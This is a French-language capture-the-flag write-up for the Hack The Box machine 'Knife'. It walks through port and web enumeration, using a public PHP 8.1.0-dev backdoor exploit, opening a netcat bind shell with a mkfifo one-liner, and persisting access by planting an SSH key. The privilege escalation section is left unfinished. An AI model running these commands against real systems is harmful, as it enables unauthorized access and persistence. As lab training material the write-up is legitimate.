- [Enumération de la machine](#enumération-de-la-machine)
- [User](#user)
  - [Service Web](#service-web)
    - [Enumération Web](#enumération-web)
    - [Recherche d'exploit pour Apache 2.4.41](#recherche-dexploit-pour-apache-2441)
      - [Recherche pour Apache 2.4.41](#recherche-pour-apache-2441)
      - [Recherche pour PHP 8.1.0-dev](#recherche-pour-php-810-dev)
    - [Récupérer un shell propre](#récupérer-un-shell-propre)
- [Privilège escalation](#privilège-escalation)


# Enumération de la machine 

```
nmap -sV -p- knife.htb
[...]
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

# User 

## Service Web 

### Enumération Web 

J'ai testé plusieurs énumération mais elles n'ont rien données:

1. Enumération Web classique: `gobuster dir -u http://knife.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt`
2. Enumération des sous-domaine DNS: `gobuster dns -u http://knife.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt`
3. Enumération des Virtual-Hosts: `gobuster vhost -u http://knife.htb -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt`

### Recherche d'exploit pour Apache 2.4.41

```
whatweb

http://knife.htb [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.162.32], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```
#### Recherche pour Apache 2.4.41

    searchsploit Apache 2.4.41

Rien d'intéressant.
Intéressons nous au deamon php

#### Recherche pour PHP 8.1.0-dev

    searchsploit php 8.1.0-dev

On voit un exploit intéressant php/webapps/49933.py

    PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution   | php/webapps/49933.py

On télécharge l'exploit:

    searchsploit -m php/webapps/49933.py

Pour exécuter le script:
    
    python3 49933.py
    # Entrer l'adresse complète pour l'attaque, ex:
    http://knife.htb

### Récupérer un shell propre

Nous avons un shell très limité (non intéractif), essayons d'en récupérer un meilleur (intéractif, pour avoir la possibilité de l'upgrader).

1. Lancer un bind shell sur la cible `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2>&1|nc -lp 4444 >/tmp/f`
2. Se connecter avec notre Kali sur la machine cible et sur le port 4444 (permet d'avoir un shell tty interactif) `nc 10.129.162.32 4444`
3. Récupérer un tty `python3 -c "import pty;pty.spawn('/bin/bash')"`

Pour finir, ajouter notre clé public SSH dans `/home/james/.ssh/authorized_keys`

Nous avons maintenant un accès SSH avec un shell complet. Pour se connecter: 

`ssh james@knife.htb`

# Privilège escalation

Il semble qu'il fut exploiter une faille au niveau du binaire "knife" 
